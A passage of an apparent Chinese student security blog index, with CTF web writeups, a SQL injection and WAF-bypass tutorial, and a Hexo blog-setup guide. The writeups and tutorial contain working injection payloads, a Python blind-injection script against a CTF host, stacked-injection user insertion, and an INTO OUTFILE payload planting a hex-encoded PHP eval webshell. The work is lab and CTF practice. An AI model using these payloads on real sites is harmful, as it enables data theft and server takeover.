<li>直接上py脚本跑：<br><img src="https://s1.ax1x.com/2018/06/11/CLls8f.png" alt="jiaoben"><br>这里需要解释一下，既然过滤了逗号，那么我们substr（,,）的语句就没用了。我们可以换一种形式表达，即substr(database()from1)，这样的返回值如图：<br><img src="https://s1.ax1x.com/2018/06/11/CLl0UI.png" alt="substr1"><br><img src="https://s1.ax1x.com/2018/06/11/CLlB5t.png" alt="substr2"><br>所以问题就来了，ascii函数对字符串的返回值是什么呢? 这个问题想了我好久，一开始是找的别人的脚本，看他们写遍历的时候卡在这个地方，这尼玛的ascii面对字符串难道不是返回NULL？！。后来发现自己惯性思维了，测试一下，ascii()这个破函数在处理字符串的时候会返回字符串第一个字符的ascii值，难受ing…</li>
</ol>
<p>还有一个问题就是过滤掉了information，这让查表就变的头疼。<br>但是我们想一下php后端处理过程，它对username的处理无非是下边框架的语句：<br>select username from 表 where username = “admin”^()<br>所以它为我们已经找好了表了，既然题把information锁死了，那flag就只可能是这个admin的密码了。那我们要做的就是查admin密码</p>
<p>看一下下面这个语句：<br><img src="https://s1.ax1x.com/2018/06/11/CLlNKe.png" alt="password"></p>
<p>我们的密码猜对时，返回false，跟上面异或的思路一样</p>

                
            </div>
            <div class="continue">
            <a href="/2018/06/06/Web题目/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/06/06/WhaleCTF的Web题目/"> 
                    WhaleCTF的Web题目 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-06-06   
                </a>
                
                <a class="category">
                    <i class="fa fa-th" aria-hidden="true"></i>  
                </a>
               
                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li></ul>
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf，web/">ctf，web</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近要做的事太多了，实验班考核、末考、再加上来成都的同学多的一批。。没时间好好学点东西，前两天装Docker，基础太差了，现在Ubuntu上docker都没搭好环境。应对最近的考核，还是刷点题吧</p>
<h3 id="瞎子摸鱼"><a href="#瞎子摸鱼" class="headerlink" title="瞎子摸鱼"></a>瞎子摸鱼</h3><p>是个Sql注入，一开始有回显我以为是基本的回显注入，后来fuzz发现过滤了函数、Infor、小括号，那基本上与回显注入无缘。我们构造admin是万能函数的时候，发现回显：<br>whaleadmin<br>我猜测这个是用户名，当不构造正确的用户名时，回显：<br>flag in the password content<br>所以后台的语句应该是这样的思路，如果查到用户名存在，则输出用户名的第一个值。若不存在，则返回flag那一堆。。</p>
<p>一开始我和LinE师傅都没想到用order by来爆破password字段，后来看到一篇类似原题的帖子。。<br><a href="https://www.cnblogs.com/deen-/p/7008939.html" target="_blank" rel="noopener">Inject again 注入 过滤左右括号 order by</a><br>思路挺简单的，就是通过order by的升序排序法进行盲注<br>后来就是写exp了，被LinE师傅嘲讽了一波。。确实py能力太差了= =<br>这里偷偷贴一下LinE师傅的exp：</p>
<pre><code>#coding:utf-8
import requests

def send(flag,charset):
    url = &quot;http://ctf.whaledu.com:10801/47g256f48gff/index.php&quot;
    h = {&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
    for i in range(len(charset)):
        c = flag + charset[i]
        payload = &quot;whaleadmin&#39; union select 1,0,&#39;{}&#39; order by 3#&quot;.format(c)
        d = &quot;username={}&amp;password=admin&quot;.format(payload)
        r = requests.post(url,data=d,headers=h)
        if &quot;whaleadmin&quot; in r.text:
            return i

def main():
    flag = &quot;&quot;
    num = &quot;0123456789&quot;
    a_z = &quot;abcdefghijklmnopqrstuvwxyz&quot;
    charset = list(num + a_z)
    for i in range(0,80):
        ret = send(flag, charset)
        flag += charset[ret-1]
        print flag

if __name__ == &#39;__main__&#39;:
    main()</code></pre><h3 id="正则进入"><a href="#正则进入" class="headerlink" title="正则进入"></a>正则进入</h3><p>源码泄露扫描得到：</p>
<pre><code>&lt;?php
echo &quot;waht the hell?&quot;;
$flag = &quot;*******&quot;; 
if  (&quot;POST&quot; == $_SERVER[&#39;REQUEST_METHOD&#39;]) 
{ 
    $password = $_POST[&#39;password&#39;]; 
    if (0 &gt;= preg_match(&#39;/^[[:graph:]]{12,}$/&#39;, $password)) 
    { 
        echo &#39;Wrong Format&#39;; 
        exit; 
    } 
    while (TRUE) 
    { 
        $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;; 
        if (6 &gt; preg_match_all($reg, $password, $arr)) 
            break; 
        $c = 0; 
        $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); 
        foreach ($ps as $pt) 
        { 
            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) 
                $c += 1; 
        } 
        if ($c &lt; 3) break; 
        if (&quot;42&quot; == $password) echo $flag; 
        else echo &#39;Wrong password&#39;; 
        exit; 
    } 
}
?&gt;</code></pre><p>结整段代码来看，我们需要post一个字符串，该字符串的值为42，并且要包含标点、数字、大写字母、小写字母中三个及以上类型，同时匹配次数要不小于6次</p>
<p>构造的payload:<br><code>password=420.00000e-1</code>或者<code>password=42.000000e-0</code></p>
<p>利用科学计数法，xe(+-)x代表的意思是，x乘以10的x次方，之所以用.我一开始不明白，但是看一下句子猜测的话，这个点的作用应该还是“乘以”，即420乘以10^(-1)，就是42。而且.也把标点位占了，所以构造很巧妙。</p>
<p>相关链接:<br><a href="http://dcx.sybase.com/1101/zh/dbreference_zh11/rf-sqllanguage-s-4915351.html" target="_blank" rel="noopener">正则表达式语法</a></p>

                
            </div>
            <div class="continue">
            <a href="/2018/06/06/WhaleCTF的Web题目/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/05/28/sql简单的注入和常见的waf绕过/"> 
                    sql简单的注入和常见的waf绕过 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-05-28   
                </a>
                
                <a class="category">
                    <i class="fa fa-th" aria-hidden="true"></i>  
                </a>
               
                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/sql基础/">sql基础</a></li></ul>
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>前一阵子为了做Ctf题临时补了一阵子mysql的相关知识，了解了一些简单的注入流程：查字段数-&gt;查库-&gt;查表-&gt;爆字段。但是应用实战或者其他稍微困难一些的Sql注入题这些还远远不够，所以决定重新学习，系统的做一下归类，并记录一下学习的过程</p>
<hr>
<h2 id="关于环境"><a href="#关于环境" class="headerlink" title="关于环境"></a>关于环境</h2><p>本地用Phostudy搭建的PHP+MYSQL环境，写了一个简单的php，类似于无脑的ctf注入题，get传参Id值</p>
<h2 id="简单的注入"><a href="#简单的注入" class="headerlink" title="简单的注入"></a>简单的注入</h2><p>刚才我们写的Php就是一个没有任何过滤的后端,值得注意的是,#的注释功能现在好像被和谐掉了，在Hackbar只能编码为%23才能代替#的作用（我竟然花了好长时间反复查看自己到底有没有过滤qaq），接下来看一下这类绝迹注入的流程.如果你本地有DVWA的环境,就直接注Simple类型就好了,先贴一张表的结构<br><img src="https://s1.ax1x.com/2018/05/30/C5JnSJ.png" alt="表结构"></p>
<h3 id="查字段"><a href="#查字段" class="headerlink" title="查字段"></a>查字段</h3><pre><code>?id=1&#39; order by 1/2/3... %23</code></pre><p>找到一个有回显的注入点，手动去猜字段，返回异常的N-1即为字段数</p>
<h3 id="查库"><a href="#查库" class="headerlink" title="查库"></a>查库</h3><p>这里字段数确认为3</p>
<pre><code>?id=-1&#39; select 1,2,database() %23</code></pre><p>两个月前刚学的时候没有搞清楚没什么Id要改成-1,其实很好理解,mysql的查询如果你的查询是存在的即返回结果,若查询不存在即返回查询结果.<br><img src="https://s1.ax1x.com/2018/05/30/C5JMO1.png" alt="avator"></p>
<h3 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h3><pre><code>?id=-1&#39; select 1,2,table_name from infomation_schema.tables where table_schema=database() %23</code></pre><h3 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h3><pre><code>?id=-1&#39; select 1,2,column_name from information_schema.columns where table_name=&#39;user&#39; %23</code></pre><p>其中User为我们刚才查到的表</p>
<h3 id="查列名下的具体值"><a href="#查列名下的具体值" class="headerlink" title="查列名下的具体值"></a>查列名下的具体值</h3><pre><code>?id=-1&#39; select 1,2,user from user %23</code></pre><p>选择查询的列为user列,一般来说ctf的题都是让你查flag列下的值,Dump出来就好.</p>
<h3 id="关于Information-schema"><a href="#关于Information-schema" class="headerlink" title="关于Information_schema"></a>关于Information_schema</h3><p>MySQL 中有一个数据库叫做information_schema，储存数据库和表的元信息。information_schema中有两个重要的表，一个叫tables，储存表的元信息，有两列特别重要，table_schema是所属数据库，table_name是表名称。另一个表示columns，储存列的源信息，table_name列是所属表名称，column_name列是列名称</p>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>盲注，即在SQL注入过程中，SQL语句执行选择后，选择的数据不能回显到前端，我们需要使用一些特殊的方法进行判断或尝试，这个过程称为盲注。其实我们用sqlmap完全可以跑，但是只会用工具最多也就是个脚本小子，要想更好的运用Sqlmap进行注入，我觉得应该从基础学起，搞清楚原理才是最重要的。</p>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>先贴一张自己写的php<br><img src="https://s1.ax1x.com/2018/05/30/C5JGFO.png" alt="avator"><br>即回显只有ture or false</p>
<h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>普及一下用法，用mysql演示一下：<br><img src="https://s1.ax1x.com/2018/05/30/C5JNSH.png" alt="limit1"></p>
<p><img src="https://s1.ax1x.com/2018/05/30/C5JYfe.png" alt="limit2"></p>
<p><img src="https://s1.ax1x.com/2018/05/30/C5JJYD.png" alt="limit3"></p>
<h4 id="猜库长"><a href="#猜库长" class="headerlink" title="猜库长"></a>猜库长</h4><pre><code>?id=1&#39; and length(database())=? %23</code></pre><p>?即为猜解的裤长，可以用二分法，及大于1，小于100，再从50划分长度。若条件成立返回ture</p>
<h4 id="猜库名"><a href="#猜库名" class="headerlink" title="猜库名"></a>猜库名</h4><p>substr()函数</p>
<p>substr(string,start,length)</p>
<ul>
<li><p>string(必需)规定要返回其中一部分的字符串。</p>
</li>
<li><p>start(必需)规定在字符串的何处开始。</p>
</li>
<li><p>length(可选)规定被返回字符串的长度。</p>
</li>
</ul>
<p>令外用到ascii()函数，返回查询到的字符的ascii的十进制值，通过大于或者小于的逻辑判断这个值为多少，进而遍历完整的数据库名。<br><code>?id=1&#39; and ascii(substr(database(),1,1))&gt;? %23</code><br>通过分析，返回的ascii确认为104，对应‘h’，与库名的hpdoger的第一个字母相应。</p>
<h4 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h4><p>这里需要在substr里嵌套mysql的语句，因为我们要找到对应的表，结合普通查询的语句来构造我们的payload</p>
<pre><code>?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1))&gt;116 %23</code></pre><pre><code>?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1))&lt;118 %23</code></pre><p>两者返回都为ture，可以判断第一个字母ascii值为117<br><img src="https://s1.ax1x.com/2018/05/30/C5JDTf.png" alt="chabiao"><br><img src="https://s1.ax1x.com/2018/05/30/C5JB0P.png" alt="chabiao"></p>
<h4 id="猜列名"><a href="#猜列名" class="headerlink" title="猜列名"></a>猜列名</h4><p><img src="https://s1.ax1x.com/2018/05/30/C5J2lj.png" alt="lieming"><br>此语句猜解的是user表的第一个列名，如是想要猜解其它列名，则更改Limit 的值</p>
<h4 id="猜字段值"><a href="#猜字段值" class="headerlink" title="猜字段值"></a>猜字段值</h4><p><img src="https://s1.ax1x.com/2018/05/30/C5Ylcj.png" alt="ziduanzhi"><br>道理相同</p>
<h3 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h3><p>返回页面无法判断语句是否执行， 面对这种情况，基于布尔的SQL盲注就很难发挥作用了（因为基于布尔的SQL盲注的前提是Web程序返回的页面存在true和false两种不同的页面）。这时</p>
<h4 id="if-与sleep（）"><a href="#if-与sleep（）" class="headerlink" title="if()与sleep（）"></a>if()与sleep（）</h4><p>其实，基于时间的盲注也是运用逻辑判断。首先看一下if()函数:</p>
<ul>
<li><p>if()<br><code>if(expr1,expr2,expr3)</code><br>如果 expr1 为真，则 IF()函数执行expr2语句; 否则 IF()函数执行expr3语句。</p>
</li>
<li><p>sleep()</p>
<pre><code>sleep(seconds)</code></pre><p>延时一段时间</p>
</li>
</ul>
<h4 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h4><p>基本思想跟与布尔盲注一样，给一句话，其他的换成相应查询就可以了</p>
<pre><code>?id=1 and if(ascii(substr(database(),1,1))&gt;100,sleep(10),null)</code></pre><h2 id="关于绕过Waf"><a href="#关于绕过Waf" class="headerlink" title="关于绕过Waf"></a>关于绕过Waf</h2><h3 id="浅谈编码绕过waf"><a href="#浅谈编码绕过waf" class="headerlink" title="浅谈编码绕过waf"></a>浅谈编码绕过waf</h3><h4 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h4><p>这两天一直在刷sqli-labs，做到现在有一点感触。一开始知道有url编码绕过这种方式，但是对于为什么能绕过成功心里是没B数的。经过这两天的测试，我想说的是，这种url编码绕过简直扯淡。人家waf过滤掉了你，你就算编码传过去一个值，到了php页面又被还原再判断，所以相当于没有任何作用。但还是写一下关于url编码的一些理解：</p>
<p>在GET传参的时候,Chrome的url会自动进行编码，而编码形式就是utf-8。一般来说，这个自动编码保留字母和数字不编的形式。其实，我感觉utf-8编码就是为了应对中文问题才诞生的。再说一下解码的问题吧，最初我不理解在php后端什么时候将url解码，后来自己用php传参，echo的结果显示，我们在用$_GET[]时，就将url给解码了。即还原了你的传参原值。所以url编码绕过就是扯淡</p>
<h4 id="0A换行污染"><a href="#0A换行污染" class="headerlink" title="%0A换行污染"></a>%0A换行污染</h4><p>在GET请求时，将URL的SQL注入关键字用%0A分隔，%0A是换行符，在mysql中可以正常执行。可以用%0a代替空格使用</p>
<h4 id="16进制绕过"><a href="#16进制绕过" class="headerlink" title="16进制绕过"></a>16进制绕过</h4><p>这个目前理解尚浅，在列库名或者表名的时候用过，因为可以避免使用单引号闭合。在concat函数里用过，作为分隔符。即0x7e表示‘~’。</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>不得不说updatexml()这个报错函数真的太强了，首先你要了解<a href="http://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html" target="_blank" rel="noopener">Xpath</a>。在Mysql中使用了一下这个函数，发现当XPath 使用路径表达式不符合规范时，就会报错，而报错的内容就非常神奇了。下面贴一张报错内容和语法：</p>
<pre><code>or updatexml(1,concat(0x7e,database()),1)</code></pre><p>0x7e是为了构造~分割<br><img src="https://s1.ax1x.com/2018/06/03/CTY9zD.png" alt="1"><br>它爆出了我们查询的库名，只要稍加修改，就可以查表、列、字段等。功能强大，依靠它打lab简直爽的不行。报错注入的姿势有很多，po一个写了十种报错函数的<a href="http://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">帖子</a></p>
<h3 id="宽子节注入"><a href="#宽子节注入" class="headerlink" title="宽子节注入"></a>宽子节注入</h3><p>对于mysql_escape_string或者是mysql_real_escape_string函数转义的单引号，我们都可以用宽子节注入使单引号逃逸。</p>
<ul>
<li>在GET类型中，我们在单引号前加一个Ascii大于128的编码，因为mysql是以gbk形式读编码的。例如我们构造%df’，则转义后变成<code>%df%5c%27</code>，那么mysql执行语句时，看到前两个编码会结合为汉字，从而是单引号逃逸。</li>
<li>在POST类型中，我们无法再使用%df进行宽子节注入。POST与GET不同，php端不对%df解码（参考对url编码的理解），而是在执行sql查询的时候对%df再进行一次utf-8的编码。结果就是，你在进行sql查询时本想借助%df逃逸，但是现在没有%df可以利用。网上提供了另一种用utf-16进行宽子节注入的payload，这里我拿来用一下，至于为什么utf-16可以借助逃逸，这个我以后学习了16和8的具体转换方式再补上。playload:<pre><code>?id=1� &#39;</code></pre></li>
</ul>
<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入顾名思义，这里简单说一下储值型的二次注入：我们将要执行的sql语句通过注册用户操作，存储到服务器里，当我们再一次进行操作时直接调用服务器里我们存储的sql语句就可以了（例如修改密码时）。举一个lab里的例子，我们注册用户登陆后,session会获得一个用户名，在那道题里，没有对session得到的用户名进行过滤，而是直接把密码更新到获取的session的用户名下，如果我们的用户名为admin’#，那么就相当于更新了Admin的密码。</p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>堆叠注入区别于二次注入，当没有创建新用户的选项时，可以考虑堆叠注入，在登陆时创建一个新用户入。先看一下labs-42的源码</p>
<pre><code>   $username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);
   $password = $_POST[&quot;login_password&quot;];
   $sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;</code></pre><p>可以对Username过滤但是未对password过滤，我们就可以为所欲为了。可以通过报错或者盲注查询出表名，构造语句向表中插入用户数据。payload如下：<br><code>login_user=123&amp;login=a&#39;;insert into users values(16,&#39;Hodoger&#39;,&#39;zq1160307775&#39;) #</code><br>show tables成功显示我们插入的用户，前提是你要查到这个登陆基于users这个表，至于怎么查，各显神通了。</p>
<h3 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h3><p>order by不能与union select 连用，所以注入就要换思路，可以用报错注入或者延时注入。</p>
<ul>
<li>报错注入的话，在之前以后列出过十种报错函数可以利用</li>
<li>还有一种注入手段是依靠rand()函数，order by 后的参数直接为rand()，rand中含有表达式，根据rand(ture/false)返回时序列不同来判断表达式是否正确，这里我们以查询库名为例写一个payload猜解:<pre><code>?sort=rand(ascii(left(database(),1))&gt;150)
</code></pre></li>
</ul>
<p>?sort=rand(ascii(left(database(),1))&lt;200)<br>```<br>sort参数php端用来接收order by处理的值，其实和布尔盲注的思想有些类似</p>
<ul>
<li>延时注入<br>与基于时间的盲注思路差不多，构造 and if语句</li>
</ul>
<h2 id="权限的注入"><a href="#权限的注入" class="headerlink" title="权限的注入"></a>权限的注入</h2><h3 id="into-outfile的传马"><a href="#into-outfile的传马" class="headerlink" title="into outfile的传马"></a>into outfile的传马</h3><p>MySQL中，可以使用SELECT…INTO OUTFILE语句将表的内容导出为一个文本文件。其基本的语法格式如下：<br><code>select [列名] from table into outfile &#39;目标文件&#39; [option]</code><br>意思就是你查询的列名导出到目标文件中。<br>具体看一道sql labs 46，基于order by 注入的题目<br>payload:</p>
<p><code>?sort=1 into outfile &#39;D:\\phpStudy\\WWW\\sqli-labs-master\\Less-46\\test.php&#39; lines terminated by 0x3c3f706870206576616c28245f504f53545b6870646f6765725d293b203f3e</code><br>sort是题目里给的order by要查询的参数，outfile后接网站的绝对路径，test.php是我要写入的文件（没有时新建），lines terminated by接木马的16进制。union select 也可以与into outfile联合使用，因为这道题是order by注入无法使用union select写入，所以借助了lines terminated by 。<br>但是我在写入的时候出现下面的页面<br><img src="https://s1.ax1x.com/2018/06/05/C7WJI0.png" alt="shibai"><br>这就是into outfile的限制了。写入之前先看看into outfile 的权限吧：<br>如果要实现用into outfile把代码写到WEB目录下，取得WEBSHELL</p>
<p><strong>3大先天条件</strong>：</p>
<ol>
<li><p>知道物理路径（into outfile ‘WEB目录的物理路径’）这样才能写对目录。（默认的当前目录是MySQL的数据目录）</p>
</li>
<li><p>能够使用union（也就是MySQL版本在3以上）</p>
</li>
<li><p>没有对’进行过滤（因为outfile后面的’’不可以用其他函数代替转换）</p>
</li>
</ol>
<p><strong>2大后天条件</strong>：</p>
<ol>
<li><p>MySQL用户拥有file_priv权限（不然就不能写文件或者把文件内容读出）</p>
</li>
<li><p>对web目录有写权限。<br>很明显，我没有file_priv的权限，在mysql里查看一下也能看到，如图<br><img src="https://s1.ax1x.com/2018/06/05/C7W8Zn.png" alt="quanxian"><br>可以自行百度一下如何在windows下开启file_priv的权限，其实就是在my.ini里把路径置空就好，重启mysql。开启后再执行payload显示如下图：<br><img src="https://s1.ax1x.com/2018/06/05/C7WtiV.png" alt="chenggong"><br>在路径下看一下传马是否成功，如图<br><img src="https://s1.ax1x.com/2018/06/05/C7WURU.png" alt="muma"><br>菜刀连接一下，成功<br><img src="https://s1.ax1x.com/2018/06/05/C7WazF.png" alt="caodao"><br>传马成功，下一步就是花样提权。不过目前导出文件的file_priv几乎都不会开启，即root的权限过低，所以可以想办法把它开启。</p>
</li>
</ol>
<hr>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>最近大佬丢了我一本sqli-labs的武林秘籍，手工打完了还是有很大收获。其实里面很多题也是可以放到sqlmap里跑，但是做个脚本小子并不是我想要的，最近忙完了转专业这些事，准备闭关修炼一下。先在这里贴一些sqlmap里tamper的用法和介绍，<a href="https://blog.csdn.net/whatday/article/details/61912578" target="_blank" rel="noopener">博客</a>总结的很好，而且也po出来一些Url，可以参考一下。</p>

                
            </div>
            <div class="continue">
            <a href="/2018/05/28/sql简单的注入和常见的waf绕过/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/05/26/利用Hexo和Github搭建个人博客/"> 
                    利用Hexo和Github搭建个人博客 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-05-26   
                </a>
                
                <a class="category">
                    <i class="fa fa-th" aria-hidden="true"></i>  
                </a>
               
                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/搭建博客/">搭建博客</a></li></ul>
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/教程，github/">教程，github</a></li></ul>
            </div>
            <div class="content">
                
                <h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>大一萌新一枚，想学点技术写一个自己的博客，记录自己的点滴。能力有限，又总要写点什么，那就写一下这次创建blog的心酸经历</p>
<h3 id="准备工具"><a href="#准备工具" class="headerlink" title="准备工具"></a>准备工具</h3><ol>
<li>首先要有一个Github账号，创建一个Reposity（库），name为username.github.io，其中username必须为你的Github账号名，否则你建立的库只会在Pages下的目录，并不是主页，个人觉得是github官方的限制，总不可能让你无限制的拥有创建主页面域名。</li>
<li>需要安装<a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a>,emmm..如果你不知道什么是<a href="www.baidu.com">Git</a></li>
<li>需要安装<a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a></li>
<li>需要安装Hexo,hexo是一款基于Node.js的静态博客框架,就是说我们可以通过hexo创建我们的博文，将md文件转换成静态文件，再部署到Github上;Hexo可以在安装了Node.js之后通过npm安装：<pre><code class="bash">$ npm install hexo-cli -g</code></pre>
笔者是在cmd下运行的npm，但看到网上的方法说最好打开Git bash运行安装<h3 id="根目录初始化"><a href="#根目录初始化" class="headerlink" title="根目录初始化"></a>根目录初始化</h3></li>
<li>首先创建一个文件夹，名字最好为uername.github.io（便与管理站点）。文件夹用来存放Hexo的配置文件</li>
<li>命令行Cd到该文件夹下，或者右键git bash，执行命令：<pre><code class="bash">$hexo init</code></pre>
</li>
<li>安装依赖包：<pre><code class="bash">$nmp install</code></pre>
此时该文件夹下会多出来很多文件，目录如下：<pre><code class="bash">.
├── _config.yml
├── package.json
├── scaffolds
├── source
|   ├── _drafts
|   └── _posts
└── themes</code></pre>
即为<a href="https://blog.csdn.net/gyq1998/article/details/78294689" target="_blank" rel="noopener">Hexo的配置文件</a><h3 id="安装上传插件-hexo-deployer-git"><a href="#安装上传插件-hexo-deployer-git" class="headerlink" title="安装上传插件 hexo-deployer-git"></a>安装上传插件 <strong>hexo-deployer-git</strong></h3><pre><code class="bash">$ npm install hexo-deployer-git --save</code></pre>
这个插件支持本地修改上传到Github<h2 id="布置自己的网站"><a href="#布置自己的网站" class="headerlink" title="布置自己的网站"></a>布置自己的网站</h2><h3 id="Clone一个你喜欢的骚主题到文件夹"><a href="#Clone一个你喜欢的骚主题到文件夹" class="headerlink" title="Clone一个你喜欢的骚主题到文件夹"></a>Clone一个你喜欢的骚主题到文件夹</h3></li>
</ol>
<ul>
<li>这里笔者用的是<a href="http://theme-next.iissnan.com/getting-started.html#select-language" target="_blank" rel="noopener">Next</a>，通过Git命令执行的github克隆：<pre><code class="bash">git clone https://github.com/iissnan/hexo-theme-next themes/next</code></pre>
</li>
<li>需要一定的时间，克隆后的文件夹名为next，在themes目录下<br><img src="https://s1.ax1x.com/2018/05/26/ChVSTP.png" alt="avatar"></li>
<li>其中，_config.yml是<a href="http://theme-next.iissnan.com/getting-started.html#select-language" target="_blank" rel="noopener">博客页面的配置文件</a>,使用详情左戳</li>
</ul>
<h3 id="配置主目录"><a href="#配置主目录" class="headerlink" title="配置主目录"></a>配置主目录</h3><ul>
<li>打开主目录下_config.yml</li>
</ul>
<ol>
<li>修改主题，使其指向我们使用的主题<pre><code class="bash">theme:next</code></pre>
</li>
<li>修改deploy项，与你自己的github相对应<pre><code class="bash">deploy:
type: git
repo: https://github.com/Hpd0ger/Hpd0ger.github.io.git
name: Hpdoger
email: # 注册Github的邮箱
branch: master</code></pre>
这个deploy信息是hexo-deployer-git插件的工作认证，执行部署操作的时候，首先会自动初始化git仓库（位置在.deploy_git中），并关联到指定repo与branch，后续public文件夹中自动生成的页面代码将会拷贝至此目录中进行代码管理。若修改了name和email，需要删掉整个.deploy_git再重新部署才会生效以及你的Github账号。<h3 id="部署到GitHub上"><a href="#部署到GitHub上" class="headerlink" title="部署到GitHub上"></a>部署到GitHub上</h3>主要有三个步骤：</li>
<li>hexo g：<pre><code class="bash">$hexo generate ：将source\_post文件下的md文件转成静态页面到public文件夹下</code></pre>
</li>
<li>hexo s:<pre><code class="bash">$hexo s ： 生成本地预览，默认情况下，访问网址为： http://localhost:4000/</code></pre>
</li>
<li>hexo d:<pre><code class="bash">$hexo d  ：将.deploy目录部署到GitHub</code></pre>
特别注意：<pre><code class="bash">$hexo clean ：清除缓存文件(db.json)和已生成的静态文件(public)。在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</code></pre>
</li>
<li>现在登陆一下自己的博客，看看有没有成功哦</li>
</ol>
<h2 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h2><h3 id="创建一篇博文"><a href="#创建一篇博文" class="headerlink" title="创建一篇博文"></a>创建一篇博文</h3><pre><code class="bash">$hexo new &#39;文章名&#39;</code></pre>
<p>会在source_post文件下创建一个md文件，系统已经为你写好了标题和日期</p>
<h3 id="创建一个页面"><a href="#创建一个页面" class="headerlink" title="创建一个页面"></a>创建一个页面</h3><pre><code class="bash">$hexo new page &quot;页面名&quot; #如 tages、catagories</code></pre>
<p>创建页面就是在主页上显示你的页面名，即你在博文的开头定义的这篇博文的标签、分类，即属于页面内容<br>会在source\目录下建立对应名称的文件夹，文件夹下有对应名称的md文件</p>
<h3 id="使用Markdown编辑器"><a href="#使用Markdown编辑器" class="headerlink" title="使用Markdown编辑器"></a>使用Markdown编辑器</h3><p>笔者使用的是cmd markdown，由于画面比较小清新所以一直使用，如果你氪金的话还可以将md文件转化为pdf格式。</p>
<h3 id="Markdown语法介绍"><a href="#Markdown语法介绍" class="headerlink" title="Markdown语法介绍"></a>Markdown语法介绍</h3><ul>
<li>这里有一篇不错的博文介绍了一下用法，个人觉得还不错<a href="https://blog.csdn.net/chwshuang/article/details/52350551" target="_blank" rel="noopener">链接</a></li>
<li>值得注意的就是标题的套用</li>
<li>对于hexo，有两种方式：<br>使用本地路径：在hexo/source目录下新建一个img文件夹，将图片放入该文件夹下，插入图片时链接即为/img/图片名称。<br>使用<a href="https://imgchr.com/" target="_blank" rel="noopener">图床</a>，地址将图片拖入区域中，会生成图片的URL，这就是链接地址。<br>第一种没有成功，笔者一直用的第二种</li>
</ul>
<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>这是笔者的第一篇博文，参考了一些google的资料。写博客目的只是为了能够提高自己，把自己所见所学写下来，比如这次博客的搭建，就花费了好多时间。最近还要忙着考四级和转专业，希望院里面的申请能通过。文采有限，希望有不对或者不好的地方可以反馈给我，接下来的阶段会闭关修炼一阵子，传一下ctf题或者sql注入绕过的博文吧。</p>
<p>未来的路还有很长，希望自己可以一直走下去</p>

                
            </div>
            <div class="continue">
            <a href="/2018/05/26/利用Hexo和Github搭建个人博客/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
</section>

  <nav class="page-nav">
